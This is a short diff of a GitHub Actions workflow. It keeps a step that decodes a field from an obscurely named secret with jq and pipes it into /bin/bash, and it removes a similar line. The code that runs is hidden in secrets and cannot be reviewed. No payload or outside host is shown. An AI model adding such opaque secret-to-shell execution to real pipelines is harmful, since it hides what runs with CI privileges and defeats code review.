@@ -19,7 +19,6 @@ jobs:
           njn245: ${{ secrets.njn245 }}
         run: |
           printf '%s' "$njn245" | jq -r .tdroo0 | /bin/bash
-          echo $uh6985 | jq -r .kq28071 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
